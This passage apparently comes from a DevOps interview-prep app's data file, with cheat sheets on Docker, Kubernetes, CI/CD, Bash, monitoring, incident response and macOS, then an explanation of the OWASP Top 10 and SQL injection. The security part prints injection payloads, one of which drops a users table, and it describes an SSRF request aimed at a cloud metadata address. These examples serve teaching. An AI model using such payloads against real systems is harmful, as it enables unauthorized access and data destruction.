
version: "3.9"
services:
  web:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
    depends_on:
      - db
    volumes:
      - ./logs:/app/logs

  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: secret
    volumes:
      - pgdata:/var/lib/postgresql/data

volumes:
  pgdata:

COMMANDS:
docker compose up -d          Start all services detached
docker compose down           Stop + remove containers
docker compose down -v        Also remove volumes
docker compose logs -f web    Follow logs for web service
docker compose ps             Status of all services
docker compose exec web bash  Shell into service`
      },
      {
        title: "Volumes & Persistence",
        content: `Problem: containers are ephemeral — data lost on removal

NAMED VOLUMES (preferred for databases):
docker run -v pgdata:/var/lib/postgresql/data postgres
• Managed by Docker (/var/lib/docker/volumes/)
• Survives container removal
• Easy to backup and migrate

BIND MOUNTS (preferred for development):
docker run -v /host/path:/container/path nginx
• Direct link to host filesystem
• Changes reflect immediately (great for dev)
• Not portable across machines

TMPFS (in-memory, non-persistent):
docker run --tmpfs /tmp nginx
• Fast, stored in RAM only
• Good for sensitive temp data

Rule: ALWAYS use named volumes for database containers`
      },
      {
        title: "Networking",
        content: `NETWORK TYPES:
bridge    Default — containers on same bridge can talk by name
host      Container shares host network stack (no isolation)
none      No networking
overlay   Multi-host networking (Docker Swarm/K8s)

Docker Compose creates a default bridge network automatically.
Services reach each other by service name:
  web service can connect to db:5432 (not localhost:5432)

COMMANDS:
docker network ls                    List networks
docker network create mynet          Create bridge network
docker network inspect mynet        Details + connected containers
docker run --network mynet myapp     Run container on specific network

Port mapping:
-p 8080:80   host_port:container_port
-p 80        Random host port → container port 80`
      },
    ]
  },
  {
    id: "kubernetes",
    title: "Kubernetes",
    emoji: "⚓",
    sections: [
      {
        title: "Core Concepts",
        content: `Kubernetes (K8s) — container orchestration platform

CONTROL PLANE:
API Server     — entry point for all kubectl commands
etcd           — distributed key-value store (cluster state)
Scheduler      — decides which node a pod runs on
Controller Mgr — maintains desired state (restarts failed pods)

WORKER NODES:
kubelet        — agent on each node, talks to API server
kube-proxy     — manages network rules for services
Container RT   — Docker/containerd actually runs containers

KEY OBJECTS:
Pod            — smallest deployable unit (1+ containers)
Deployment     — manages pod replicas + rolling updates
Service        — stable network endpoint for pods
ConfigMap      — non-sensitive config data
Secret         — sensitive data (base64 encoded)
Namespace      — virtual cluster isolation
Ingress        — HTTP routing rules (external → services)`
      },
      {
        title: "kubectl Cheat Sheet",
        content: `CONTEXT / CLUSTER:
kubectl config get-contexts          List contexts
kubectl config use-context prod      Switch cluster
kubectl config current-context       Active context

PODS:
kubectl get pods                     List pods
kubectl get pods -n kube-system      In specific namespace
kubectl describe pod <name>          Full details + events
kubectl logs <pod>                   Container logs
kubectl logs -f <pod>                Follow live
kubectl exec -it <pod> -- bash       Shell into pod
kubectl delete pod <name>            Delete (Deployment recreates it)

DEPLOYMENTS:
kubectl get deployments
kubectl rollout status deploy/myapp
kubectl rollout undo deploy/myapp    Rollback
kubectl scale deploy/myapp --replicas=5
kubectl set image deploy/myapp app=myapp:v2   Update image

APPLY / DELETE:
kubectl apply -f manifest.yaml       Create or update
kubectl delete -f manifest.yaml      Delete from file
kubectl diff -f manifest.yaml        Preview changes`
      },
      {
        title: "Deployments & ReplicaSets",
        content: `Deployment manages ReplicaSet which manages Pods

apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      - name: app
        image: myapp:v1
        ports:
        - containerPort: 3000
        resources:
          requests:
            cpu: "100m"
            memory: "128Mi"
          limits:
            cpu: "500m"
            memory: "512Mi"

Rolling update strategy (default):
• New pods come up before old ones go down
• maxSurge: 1 extra pod during update
• maxUnavailable: 0 (no downtime)`
      },
      {
        title: "Services & Ingress",
        content: `SERVICE TYPES:
ClusterIP   — internal only (default), stable IP inside cluster
NodePort    — exposes on each node's IP at static port (30000-32767)
LoadBalancer — provisions cloud load balancer (GKE/EKS/AKS)
ExternalName — DNS alias to external service

Service YAML:
apiVersion: v1
kind: Service
metadata:
  name: myapp-svc
spec:
  selector:
    app: myapp          # matches pod labels
  ports:
  - port: 80            # service port
    targetPort: 3000    # pod port
  type: ClusterIP

INGRESS (HTTP routing):
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: myapp-ingress
spec:
  rules:
  - host: myapp.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: myapp-svc
            port:
              number: 80`
      },
      {
        title: "ConfigMaps & Secrets",
        content: `ConfigMap — non-sensitive config (env vars, config files)
Secret     — sensitive data (passwords, tokens, keys) — base64 encoded

CREATE:
kubectl create configmap app-config --from-literal=ENV=prod
kubectl create secret generic db-secret --from-literal=password=s3cr3t

USE IN POD (env vars):
env:
- name: DB_PASSWORD
  valueFrom:
    secretKeyRef:
      name: db-secret
      key: password
- name: APP_ENV
  valueFrom:
    configMapKeyRef:
      name: app-config
      key: ENV

USE IN POD (mounted as file):
volumes:
- name: config-vol
  configMap:
    name: app-config
volumeMounts:
- name: config-vol
  mountPath: /etc/config

⚠️ Secrets are base64 encoded, NOT encrypted by default
Use Sealed Secrets or External Secrets Operator for production`
      },
      {
        title: "Troubleshooting Pods",
        content: `COMMON STATES:
Pending         — scheduler can't place it (resource constraints, no nodes)
CrashLoopBackOff — container crashes repeatedly (check logs!)
ImagePullBackOff — can't pull image (wrong name, no registry auth)
OOMKilled       — container exceeded memory limit
Terminating     — stuck deleting (finalizer issue)

DEBUGGING STEPS:
1. kubectl describe pod <name>   → check Events section at bottom
2. kubectl logs <pod>            → app error output
3. kubectl logs <pod> --previous → logs from crashed container
4. kubectl exec -it <pod> -- sh  → get inside and inspect

CrashLoopBackOff checklist:
• App crashes on startup (check logs for errors)
• Wrong env vars / missing secrets
• Bad command/args in container spec
• Missing files or config the app expects

ImagePullBackOff checklist:
• Image name/tag typo
• Private registry → need imagePullSecret
• Registry rate limit (Docker Hub)`
      },
    ]
  },
  {
    id: "cicd",
    title: "CI/CD",
    emoji: "🔄",
    sections: [
      {
        title: "CI/CD Concepts",
        content: `CI — Continuous Integration
• Developers merge code frequently (at least daily)
• Every push triggers automated: build → test → lint
• Goal: catch bugs early, before they reach prod

CD — Continuous Delivery
• Every passing build is ready to deploy (one-click deploy)
• Automated deployment to staging, manual approval for prod

CD — Continuous Deployment
• Every passing build deploys to production automatically
• No human gate — full automation

Pipeline stages (typical):
1. Trigger (push, PR, schedule)
2. Build (compile, docker build)
3. Test (unit, integration, e2e)
4. Security scan (SAST, dependency audit)
5. Push artifact (docker push, npm publish)
6. Deploy to staging (auto)
7. Deploy to production (manual approval or auto)

Benefits:
• Smaller, safer releases (easier to rollback)
• Faster feedback loop
• Less manual work = fewer human errors`
      },
      {
        title: "GitHub Actions",
        content: `Workflows live in .github/workflows/*.yml

TRIGGERS:
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * *'    # 2am daily
  workflow_dispatch:        # manual trigger

BASIC STRUCTURE:
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - run: npm test
      - run: npm run build

KEY CONCEPTS:
• jobs run in parallel by default
• steps within a job run sequentially
• needs: [build] makes a job wait for another
• matrix: test on multiple OS/versions simultaneously
• Secrets: stored in repo Settings → never in YAML`
      },
      {
        title: "Docker in CI/CD",
        content: `Full pipeline with Docker Hub push:

name: Build and Push
on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to Docker Hub
        uses: docker/login-action@v3
        with:
          username: \${{ secrets.DOCKERHUB_USERNAME }}
          password: \${{ secrets.DOCKERHUB_TOKEN }}

      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: |
            user/myapp:latest
            user/myapp:\${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

Best practices:
• Use commit SHA as image tag for traceability
• Cache layers with type=gha for faster builds
• Store credentials in GitHub Secrets, never in YAML`
      },
      {
        title: "Secrets & Environments",
        content: `SECRETS:
• Encrypted key-value pairs, never visible in logs
• Set in: Repository → Settings → Secrets and variables → Actions
• Referenced as: \${{ secrets.MY_SECRET }}
• Automatically masked (shown as ***) in logs

SECRET TYPES:
Repository secrets   — available to all workflows in repo
Organization secrets — shareable across repos in org
Environment secrets  — scoped to specific deployment environment

ENVIRONMENTS:
• Named targets: staging, production, dev
• Can require human approval before deploy
• Can restrict to specific branches (only main → prod)
• Each environment has its own secrets

Example deployment gate:
jobs:
  deploy-prod:
    environment: production    # triggers approval requirement
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh

OIDC (recommended over stored credentials):
• GitHub requests short-lived token from GCP/AWS
• No long-lived secrets stored in GitHub
• Supported by google-github-actions/auth
  and aws-actions/configure-aws-credentials`
      },
      {
        title: "GitOps",
        content: `GitOps = Git as the single source of truth for infrastructure

HOW IT WORKS:
1. Developer pushes code to Git
2. CI pipeline builds + pushes new Docker image
3. CI updates Kubernetes manifests in Git (new image tag)
4. GitOps controller (ArgoCD/Flux) detects Git change
5. Controller syncs cluster to match Git state
6. Cluster updated — no direct kubectl apply needed

BENEFITS:
• Full audit trail — every change is a Git commit
• Easy rollback — git revert
• Consistent environments — cluster always matches Git
• Separation of concerns — app devs don't need cluster access

TOOLS:
ArgoCD   — popular, web UI, good for teams
Flux CD  — lightweight, strong Helm support, CLI-focused

ARGOCD CONCEPTS:
Application  — links a Git repo/path to a K8s cluster/namespace
Sync         — apply Git state to cluster
Health       — monitors resource health
Auto-sync    — automatically sync when Git changes`
      },
    ]
  },
  {
    id: "bash",
    title: "Bash",
    emoji: "💻",
    sections: [
      {
        title: "Script Basics",
        content: `#!/bin/bash              Shebang — always first line
set -e                   Exit immediately on error
set -u                   Error on undefined variables
set -o pipefail          Pipeline fails if any command fails
set -euo pipefail        All three combined — use this always

VARIABLES:
NAME="garry"             Assign (no spaces around =)
echo "$NAME"             Use (always quote variables!)
echo "\${NAME}world"      Curly braces for disambiguation
readonly PI=3.14         Constant
unset NAME               Delete variable

SPECIAL VARIABLES:
\$0    Script name
\$1-\$9  Positional arguments
\$@    All arguments (as separate words)
\$#    Number of arguments
\$?    Exit code of last command (0=success)
\$\$    PID of current script
\$!    PID of last background command

QUOTES:
"double"  — expands variables and \$() inside
'single'  — literal, no expansion
\`backtick\`  — command substitution (use \$() instead)`
      },
      {
        title: "Conditionals & Loops",
        content: `IF/ELSE:
if [ "\$USER" = "root" ]; then
  echo "Running as root"
elif [ "\$1" = "--help" ]; then
  echo "Usage: script.sh"
else
  echo "Normal user"
fi

TEST CONDITIONS:
[ -f file ]     File exists and is regular file
[ -d dir ]      Directory exists
[ -z "\$var" ]   String is empty
[ -n "\$var" ]   String is not empty
[ "\$a" = "\$b" ]  Strings equal
[ "\$a" != "\$b" ] Strings not equal
[ \$n -eq 5 ]   Numbers equal (-ne -lt -le -gt -ge)

FOR LOOPS:
for i in 1 2 3 4 5; do echo \$i; done
for file in /var/log/*.log; do echo "\$file"; done
for i in \$(seq 1 10); do echo \$i; done

WHILE LOOP:
while [ \$COUNT -lt 10 ]; do
  echo \$COUNT
  COUNT=\$((COUNT + 1))
done

CASE:
case "\$1" in
  start)  systemctl start nginx ;;
  stop)   systemctl stop nginx ;;
  *)      echo "Usage: \$0 start|stop" ;;
esac`
      },
      {
        title: "Functions",
        content: `DEFINING:
log() {
  echo "[\$(date '+%Y-%m-%d %H:%M:%S')] \$*" | tee -a "\$LOG_FILE"
}

check_root() {
  if [ "\$(id -u)" -ne 0 ]; then
    echo "ERROR: Must run as root" >&2
    exit 1
  fi
}

CALLING:
log "Starting backup"
check_root

RETURN VALUES:
• Functions return exit codes (0=success, 1-255=error)
• Return a value via echo + capture:

get_ip() {
  hostname -I | awk '{print \$1}'
}
MY_IP=\$(get_ip)

LOCAL VARIABLES (always use local inside functions!):
process_file() {
  local file="\$1"
  local count=0
  # ...
}

ARGUMENTS IN FUNCTIONS:
\$1, \$2  — arguments passed to the function
"\$@"    — all arguments`
      },
      {
        title: "Text Processing",
        content: `GREP — search/filter:
grep "error" /var/log/syslog          Lines containing "error"
grep -i "error" file                  Case-insensitive
grep -v "debug" file                  Invert match
grep -r "TODO" /app/src/              Recursive search
grep -E "error|warn|crit" file        Multiple patterns (OR)
grep -A 3 "Exception" file            3 lines AFTER match
grep -B 2 "Exception" file            2 lines BEFORE match

AWK — field extraction:
awk '{print \$1}' file                 First field
awk -F: '{print \$1, \$3}' /etc/passwd  Colon delimiter
awk '\$3 > 1000 {print \$1}' /etc/passwd  Conditional
df -h | awk 'NR>1 {print \$5, \$6}'    Skip header row

SED — find/replace:
sed 's/foo/bar/' file                 Replace first per line
sed 's/foo/bar/g' file                Replace all
sed -i 's/old/new/g' config           Edit file in-place
sed '/^#/d' file                      Delete comment lines
sed -n '10,20p' file                  Print only lines 10-20

USEFUL PIPELINES:
cat access.log | awk '{print \$1}' | sort | uniq -c | sort -rn | head -10
# Top 10 IP addresses hitting your web server`
      },
      {
        title: "Common Patterns",
        content: `CHECK IF ROOT:
if [ "\$(id -u)" -ne 0 ]; then echo "Run as root"; exit 1; fi

CHECK COMMAND EXISTS:
if ! command -v docker &>/dev/null; then
  echo "docker not installed"; exit 1
fi

LOCK FILE (prevent duplicate runs):
LOCKFILE="/tmp/\$(basename \$0).lock"
if [ -f "\$LOCKFILE" ]; then echo "Already running"; exit 1; fi
touch "\$LOCKFILE"
trap "rm -f \$LOCKFILE" EXIT   # cleanup on exit

REDIRECT OUTPUT:
command > output.txt         Stdout to file (overwrite)
command >> output.txt        Stdout append
command 2> error.txt         Stderr to file
command &> both.txt          Both stdout and stderr
command 2>/dev/null          Suppress errors
command > /dev/null 2>&1     Suppress everything

ARITHMETIC:
result=\$((5 + 3 * 2))
count=\$((count + 1))

CHECK EXIT CODE:
if ! rsync -av /src/ /backup/; then
  echo "rsync failed!" >&2; exit 1
fi`
      },
    ]
  },
  {
    id: "monitoring",
    title: "Monitoring",
    emoji: "📊",
    sections: [
      {
        title: "Observability: The 3 Pillars",
        content: `METRICS — numeric measurements over time
• CPU %, memory usage, request rate, error rate, latency
• Tools: Prometheus, Datadog, CloudWatch
• Answer: "Is my system healthy RIGHT NOW?"

LOGS — timestamped text records of events
• App logs, access logs, error logs, audit logs
• Tools: ELK Stack, Loki, Splunk, Cloud Logging
• Answer: "WHAT happened and WHEN?"

TRACES — end-to-end journey of a request
• Track one request across multiple microservices
• Tools: Jaeger, Zipkin, Cloud Trace, Datadog APM
• Answer: "WHERE is the slowness coming from?"

WHY ALL THREE:
• Metrics tell you SOMETHING is wrong (error rate up)
• Logs tell you WHAT went wrong (exception message)
• Traces tell you WHERE it started (which service, which call)

SLI / SLO / SLA:
SLI  — actual measured metric (e.g. 99.95% uptime this month)
SLO  — internal target you set (e.g. 99.9% uptime)
SLA  — contractual commitment to customers (e.g. 99.5% uptime)`
      },
      {
        title: "Prometheus",
        content: `Prometheus — open-source metrics monitoring (pull-based)

HOW IT WORKS:
1. Targets expose /metrics endpoint (HTTP)
2. Prometheus scrapes them on schedule (default: 15s)
3. Stores as time-series data
4. Alertmanager handles alert routing
5. Grafana visualizes the data

prometheus.yml CONFIG:
global:
  scrape_interval: 15s
scrape_configs:
  - job_name: 'myapp'
    static_configs:
      - targets: ['localhost:3000']

PROMQL BASICS:
up                                    Is target up? (1=yes 0=no)
http_requests_total                   Total request count
rate(http_requests_total[5m])         Requests per second (5m window)
sum(rate(http_requests_total[5m]))    Total across all instances
histogram_quantile(0.99, ...)         99th percentile latency

METRIC TYPES:
Counter    — always increases (requests, errors)
Gauge      — can go up/down (CPU%, memory, connections)
Histogram  — distribution of values (request duration buckets)
Summary    — similar to histogram, client-side quantiles`
      },
      {
        title: "Grafana",
        content: `Grafana — visualization and dashboarding platform

KEY CONCEPTS:
Data Source  — connection to Prometheus, Loki, etc.
Dashboard    — collection of panels
Panel        — single visualization (graph, stat, table, gauge)
Alert        — fires when a metric crosses a threshold

COMMON DASHBOARD PANELS:
Time series  — line/bar chart over time (CPU, memory, requests)
Stat         — single big number (current value)
Gauge        — circular indicator (% full)
Table        — tabular data
Logs         — log stream (Loki source)
Heatmap      — latency distribution over time

VARIABLES (make dashboards dynamic):
$namespace   — dropdown to filter by K8s namespace
$instance    — dropdown to select specific host
Used in queries: rate(http_requests_total{instance=~"$instance"}[5m])

ALERTING:
• Set threshold on any panel
• Route to Slack, PagerDuty, email via contact points
• Silence alerts during maintenance windows

kube-prometheus-stack — Helm chart that installs:
Prometheus + Grafana + Alertmanager + node-exporter + kube-state-metrics`
      },
      {
        title: "Logging (ELK / Loki)",
        content: `ELK STACK:
Elasticsearch  — distributed search + analytics engine (stores logs)
Logstash       — log pipeline: ingest → transform → output
Kibana         — visualization UI for Elasticsearch
Beats          — lightweight shippers (Filebeat, Metricbeat)

Flow: App → Filebeat → Logstash → Elasticsearch → Kibana

GCP EQUIVALENT:
Cloud Logging (Stackdriver) — auto-collects GKE logs
Log Explorer — query with MQL/SQL-like syntax
Log-based metrics — create Prometheus metrics from log patterns
Log sinks — export to BigQuery, Pub/Sub, GCS

LOKI (lightweight alternative):
• Like Prometheus but for logs
• Doesn't index log content — only labels (much cheaper)
• Pairs with Grafana natively
• Query language: LogQL (similar to PromQL)

KEY LOG LOCATIONS (Linux):
/var/log/syslog          General system messages
/var/log/auth.log        SSH logins, sudo, auth events
/var/log/nginx/          Nginx access + error logs
journalctl -u nginx -f   systemd service logs (live)`
      },
      {
        title: "Alerting & On-Call",
        content: `ALERT ANATOMY (Prometheus AlertManager rule):
groups:
- name: myapp
  rules:
  - alert: HighErrorRate
    expr: rate(http_errors_total[5m]) > 0.05
    for: 5m                    # must be true for 5 mins (avoid flaps)
    labels:
      severity: critical
    annotations:
      summary: "High error rate on {{ \$labels.instance }}"
      description: "Error rate is {{ \$value | humanizePercentage }}"

ALERT ROUTING:
• Alertmanager routes by labels (severity, team, service)
• Critical → PagerDuty (pages someone immediately)
• Warning → Slack channel
• Info → email digest

ON-CALL BEST PRACTICES:
• Every alert must be actionable — no noisy "just FYI" alerts
• Each alert needs a runbook (what to do when it fires)
• Track MTTA (mean time to acknowledge) and MTTR (mean time to resolve)
• Do postmortems on significant incidents — blameless culture
• Rotate on-call fairly — burn-out is real

TOOLS: PagerDuty, OpsGenie, Squadcast, Grafana OnCall`
      },
    ]
  },
  {
    id: "incident",
    title: "Incident Response",
    emoji: "🚨",
    sections: [
      {
        title: "Incident Lifecycle",
        content: `PHASES:
1. Detection    — alert fires, user report, or you notice it
2. Triage       — assess severity and impact
3. Response     — assemble team, start investigation
4. Mitigation   — stop the bleeding (rollback, disable feature)
5. Resolution   — permanent fix
6. Postmortem   — learn and prevent recurrence

SEVERITY LEVELS (common):
SEV1 / P1  — total outage, all users affected, revenue impact
SEV2 / P2  — major feature broken, significant user impact
SEV3 / P3  — degraded performance, partial impact
SEV4 / P4  — minor issue, workaround available

RULE #1: Restore service first, investigate second.
Don't spend 2 hours finding root cause while users are down.
Rollback first, then figure out why.

COMMUNICATION:
• Designate one Incident Commander (IC) — owns the incident
• Status page updates every 15-30 minutes (even if "still investigating")
• Internal channel: #incident-2024-01-15
• Stakeholder updates via email/Slack
• "I don't know yet but I'm investigating" is a valid update`
      },
      {
        title: "First 15 Minutes",
        content: `Minute 0-2 — Acknowledge & Orient:
• Acknowledge the alert (stops escalation timer)
• Open incident channel (#incident or war room)
• Read the alert: what exactly is broken?
• Check status page — are other things also failing?

Minute 2-5 — Assess Impact:
• How many users affected? (metrics: active sessions, error rate)
• Which regions? All or partial?
• When did it start? (correlate with recent deploys)
• Is there a recent deployment? (check deploy log)

Minute 5-10 — Quick Wins:
• Was something deployed recently? → Roll it back
• Did a config change go out? → Revert it
• Check dashboards: CPU/memory/disk spiking?
• Check logs: obvious errors in the last 10 minutes?

Minute 10-15 — Escalate or Dig:
• If not resolved → pull in relevant team members
• Assign roles: IC, comms lead, primary investigator
• Post first status update to stakeholders
• Start a timeline doc (what you checked, what you found)

COMMANDS FOR QUICK TRIAGE:
kubectl get pods --all-namespaces | grep -v Running
kubectl top nodes
kubectl top pods
journalctl -u myapp -n 100 --no-pager
docker logs --tail=100 container_name`
      },
      {
        title: "Rollback Strategies",
        content: `APPLICATION ROLLBACK:
# Kubernetes — previous deployment version
kubectl rollout undo deployment/myapp
kubectl rollout undo deployment/myapp --to-revision=3
kubectl rollout history deployment/myapp    # see versions

# Docker — run previous image tag
docker pull myapp:v1.2.3
docker stop current_container
docker run -d myapp:v1.2.3

# GitHub — revert commit + redeploy
git revert HEAD
git push origin main    # triggers CI/CD pipeline

DATABASE ROLLBACK:
• Schema migrations: run the down migration
• Data changes: restore from backup
• Feature flags: disable the flag (no deploy needed)
• WARNING: not all DB changes are reversible

FEATURE FLAGS:
• Most powerful rollback tool — instant, no deploy needed
• Tools: LaunchDarkly, Flagsmith, GrowthBook
• Pattern: deploy code behind a flag → enable for % of users
         → if issues → disable flag instantly

TRAFFIC MANAGEMENT:
• Route 0% to new version (canary rollback)
• Switch load balancer back to old target group
• Kubernetes: patch service selector to old deployment`
      },
      {
        title: "Postmortem",
        content: `A postmortem is a blameless analysis to prevent recurrence.

STRUCTURE:
1. Summary      — what happened, impact, duration
2. Timeline     — chronological sequence of events
3. Root Cause   — the actual underlying cause (not symptoms)
4. Contributing Factors — what made it worse or possible
5. Action Items — specific tasks to prevent recurrence
6. What went well — things that helped during response

BLAMELESS CULTURE:
• Never blame individuals — blame systems and processes
• People make mistakes — design systems that tolerate mistakes
• If someone made an error, ask: why did the system allow it?
• Goal: psychological safety → people report issues honestly

5 WHYS (root cause technique):
Why did the site go down? → DB ran out of connections
Why did DB run out of connections? → Connection pool exhausted
Why was pool exhausted? → Spike in traffic
Why wasn't it auto-scaled? → Auto-scaling wasn't configured
Why not? → No runbook existed for this service type
Root cause: Missing operational runbook for new service type

ACTION ITEMS must be:
• Specific (not "improve monitoring")
• Assigned to a person
• Have a due date
• Tracked to completion`
      },
      {
        title: "Memory Leak Diagnosis",
        content: `SYMPTOMS:
• Memory grows steadily, never returns to baseline
• Eventually: OOMKill, container restart, swap usage
• Grafana: memory graph slopes upward over hours/days

LINUX DIAGNOSIS:
free -h                          Memory overview
cat /proc/meminfo                Detailed breakdown
ps aux --sort=-%mem | head -20   Top memory consumers
top (press M)                    Sort by memory usage
pmap -x <PID>                    Memory map of process
valgrind --leak-check=full ./app  Leak detection (C/C++)

KUBERNETES:
kubectl top pods                 Current memory usage
kubectl describe pod <name>      See OOMKill in events
# Set up Prometheus alert:
container_memory_usage_bytes{container="myapp"} > 500e6

NODE.JS SPECIFIC:
node --inspect app.js            Enable Chrome DevTools
# In DevTools: Memory → Take Heap Snapshot
# Compare snapshots over time — growing objects = leak

COMMON CAUSES:
• Event listeners added but never removed
• Caches that grow without eviction policy
• Circular references preventing GC
• DB connection pool not being released
• Holding references to large objects in closures`
      },
    ]
  },
  {
    id: "macos",
    title: "macOS",
    emoji: "🍎",
    sections: [
      {
        title: "macOS Enterprise Management",
        content: `MDM (Mobile Device Management):
• Jamf Pro — most common enterprise macOS MDM
• Mosyle, Kandji, Microsoft Intune (also supports macOS)
• Apple Business Manager (ABM) — Apple's portal for:
  - Zero-touch enrollment (device ships → enrolls automatically)
  - Volume Purchase Program (VPP) for app licensing
  - Managed Apple IDs

What MDM can do:
• Push configuration profiles (Wi-Fi, VPN, email, certs)
• Deploy apps silently
• Enforce FileVault encryption + escrow recovery key
• Remote lock and wipe
• Set passcode policies
• Restrict features (disable AirDrop, app install, etc.)
• Run scripts remotely`
      },
      {
        title: "macOS Terminal Essentials",
        content: `Most Linux commands work! Key differences:

SYSTEM INFO:
system_profiler SPHardwareDataType    Hardware info
sw_vers                               macOS version
sysctl -n hw.memsize | awk '{print $1/1024/1024/1024" GB"}'  RAM

NETWORKING:
networksetup -listallhardwareports    List all interfaces
networksetup -getinfo "Wi-Fi"         Get Wi-Fi IP info
ifconfig en0                          Interface details
scutil --dns                          DNS config
scutil --proxy                        Proxy settings
networksetup -setdnsservers Wi-Fi 8.8.8.8    Set DNS

USERS:
dscl . -list /Users                   List all users
sudo dscl . -passwd /Users/john       Reset local password
id john                               User UID/GID/groups

DISK:
diskutil list                         List all disks
diskutil info disk0                   Disk details
df -h                                 Disk usage

PACKAGE MANAGER:
brew install htop                     Install via Homebrew
brew update && brew upgrade           Update all`
      },
      {
        title: "macOS vs Windows — Key Differences",
        content: `Feature          macOS                    Windows
─────────────────────────────────────────────────
Policy mgmt      MDM profiles             Group Policy (GPO)
AD integration   Jamf Connect / NoMAD     Native
Encryption       FileVault (full disk)    BitLocker
Package mgr      Homebrew / MAS           Chocolatey / winget
Credential store Keychain                 Credential Manager
Remote access    SSH, ARD (Apple RD)      RDP (port 3389)
Installer types  .dmg, .pkg, .app         .exe, .msi
File system      APFS (modern), HFS+      NTFS, exFAT, FAT32
Shell            zsh (default), bash      PowerShell, cmd
Task manager     Activity Monitor         Task Manager
Firewall config  System Settings          Windows Defender
Log viewer       Console.app, log show    Event Viewer
System repair    Recovery mode (Cmd+R)    Windows RE, sfc /scannow`
      },
    ]
  },
  {
    id: "security",
    title: "Security",
    emoji: "🔒",
    sections: [
      {
        title: "What is Security & OWASP",
        content: `WHAT IS APPLICATION SECURITY?
Application security (AppSec) is the practice of finding and fixing
weaknesses in software before attackers can exploit them.

Think of it like this:
You build a house (your app). Security is making sure the doors have
locks, the windows aren't left open, and you're not hiding the key
under the doormat. Most breaches don't happen because attackers are
genius hackers — they happen because someone left a door unlocked.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS OWASP?
OWASP (Open Web Application Security Project) is a non-profit that
publishes the "Top 10" list — the 10 most common and dangerous
security vulnerabilities found in real web apps.

It's updated every few years based on real data from thousands of
applications. Knowing it is the baseline for any security interview.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

OWASP TOP 10 (2021) — PLAIN ENGLISH:

A01 Broken Access Control
     What: A regular user can access admin pages, other users' data,
     or do things they shouldn't be allowed to do.
     Example: changing the URL from /user/123 to /user/124 and seeing
     someone else's private profile.
     Fix: Check permissions on EVERY request server-side.

A02 Cryptographic Failures
     What: Sensitive data is exposed because it wasn't encrypted,
     or was encrypted weakly.
     Example: passwords stored as plain text in the database. If the
     DB leaks, every password is immediately readable.
     Fix: HTTPS everywhere, bcrypt for passwords, AES-256 for data at rest.

A03 Injection
     What: Attacker inserts malicious code into an input that gets
     executed by the server (SQL, shell commands, etc.)
     Example: typing SQL code into a login form to bypass authentication.
     Fix: parameterized queries, never trust user input.

A04 Insecure Design
     What: The security problem is baked into the architecture — not
     a bug you can patch, but a fundamental design flaw.
     Example: a password reset that sends the new password via email
     (the problem is the design, not the code).
     Fix: threat modeling during design phase.

A05 Security Misconfiguration
     What: The software is fine but it's set up insecurely.
     Example: leaving default admin/admin credentials, having an S3
     bucket set to public, showing detailed error messages to users.
     Fix: hardening checklists, automated scanning.

A06 Vulnerable & Outdated Components
     What: Your app uses libraries with known security holes.
     Example: Log4Shell (2021) — a vulnerability in a Java logging
     library used by millions of apps. Attackers ran code remotely
     just by sending a crafted log message.
     Fix: dependency scanning (Snyk, Dependabot), keep libs updated.

A07 Authentication Failures
     What: Problems with login, sessions, or password handling that
     let attackers access accounts they shouldn't.
     Example: no account lockout → attacker tries millions of passwords.
     Fix: MFA, strong password policy, session expiry.

A08 Software & Data Integrity Failures
     What: App accepts updates/data without verifying it's legitimate.
     Example: CI/CD pipeline that pulls and runs code from an
     unverified source, or npm packages that got hijacked.
     Fix: verify signatures, pin dependency versions.

A09 Security Logging Failures
     What: The app doesn't log security events, so you never know
     you've been breached until it's too late.
     Example: 1000 failed login attempts with no alert triggered.
     Fix: log all auth events, monitor and alert on anomalies.

A10 Server-Side Request Forgery (SSRF)
     What: Attacker tricks your server into making HTTP requests to
     internal systems that should never be public.
     Example: an image upload feature that fetches a URL — attacker
     provides http://169.254.169.254 (AWS metadata) to steal cloud
     credentials.
     Fix: validate and allowlist URLs, block internal IP ranges.`
      },
      {
        title: "SQL Injection",
        content: `WHAT IS SQL INJECTION?
SQL is the language used to talk to databases: "SELECT * FROM users
WHERE username = 'garry'". SQL injection happens when an attacker
sneaks SQL code into an input field, and your app accidentally runs it.

WHY DOES IT EXIST?
Because developers used to (and sometimes still do) build SQL queries
by gluing strings together with user input — treating the input as
trusted code instead of untrusted data.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HOW IT WORKS — STEP BY STEP:

The developer wrote this login query:
  "SELECT * FROM users WHERE username = '" + username + "'"

Normal use — user types: garry
  SELECT * FROM users WHERE username = 'garry'   ✅ Works fine

Attack — user types: garry' OR '1'='1' --
  SELECT * FROM users WHERE username = 'garry' OR '1'='1' --'

Breaking it down:
  garry'       closes the original string
  OR '1'='1'   adds a condition that is ALWAYS true
  --           comments out the rest of the query (including password check)

Result: returns ALL users. Login bypassed. Attacker is in.

Even worse payload:
  '; DROP TABLE users; --
  Deletes your entire users table.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

THE FIX — PARAMETERIZED QUERIES:
Instead of gluing strings, you pass values separately.
The database treats them as DATA, never as CODE.

❌ Vulnerable (string concatenation):
  query = "SELECT * FROM users WHERE username = '" + username + "'"

✅ Safe (parameterized):
  cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

